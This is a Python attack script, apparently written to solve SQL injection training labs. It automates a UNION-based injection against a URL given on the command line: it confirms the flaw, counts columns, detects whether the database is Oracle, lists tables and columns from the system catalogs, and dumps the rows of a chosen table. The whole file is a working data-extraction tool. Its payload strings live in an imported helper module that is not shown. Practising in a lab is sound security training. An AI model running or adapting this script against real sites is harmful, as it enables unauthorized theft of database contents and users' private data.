# Lab 5 & 6 - SQL Injection: Listing Database Contents
# Supports both Oracle and non-Oracle databases
# Technique: UNION SELECT against information_schema (non-Oracle) or all_tables/all_tab_columns (Oracle)
# Usage: python lab5&6.py <url>

import sys
import requests
import urllib3
from bs4 import BeautifulSoup
from proxies import proxies
from sqli_utils import check_vulnerability, banner, section, get_number_of_columns, detect_db_type, find_text_column, list_tables, list_columns, dump_table,FILTER_PATH,TABLE_QUERIES,COLUMN_QUERIES

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



if __name__ == "__main__":
    banner()
    section("LAB 5 & 6 — SQL INJECTION: LISTING DATABASE CONTENTS")

    if len(sys.argv) != 2:
        print("  Usage: python lab5&6.py <url>")
        sys.exit(1)

    target_url = sys.argv[1].rstrip("/") + "/"

    # Step 1: Confirm vulnerability
    if not check_vulnerability(target_url, FILTER_PATH):
        print("\n  ✘  Exiting — target does not appear vulnerable.")
        sys.exit(1)

    # Step 2: Find column count
    col_num = get_number_of_columns(target_url, FILTER_PATH)
    if col_num is None:
        print("\n  ✘  Exiting — could not determine column count.")
        sys.exit(1)

    # Step 3: Detect DB type — Oracle uses different catalog queries
    db_type = detect_db_type(target_url, col_num, FILTER_PATH)
    if db_type is None:
        print("\n  ✘  Exiting — could not detect database type.")
        # sys.exit(1)

    # Normalize to oracle / non-oracle for catalog query selection
    db_key = "oracle" if db_type == "Oracle" else "non-oracle"

    # Step 4: List all tables
    tables = list_tables(target_url, col_num, db_key)
    if not tables:
        sys.exit(1)

    # Step 5: Prompt for a table name → list its columns
    print()
    target_table = input("  ➜  Enter table name to inspect: ").strip()
    columns = list_columns(target_url, col_num, db_key, target_table)
    if not columns:
        sys.exit(1)

    # Step 6: Prompt for columns to dump → display rows
    print()
    print(f"  ➜  Available columns: {', '.join(columns)}")
    selected = input(f"  ➜  Enter {col_num} columns to dump (comma-separated, or press Enter for all): ").strip()
    chosen_cols = [c.strip() for c in selected.split(",")] if selected else columns

    dump_table(target_url, col_num, target_table, chosen_cols)

    print(f"\n{'#' * 50}")
    print("#  Done.")
    print(f"{'#' * 50}\n")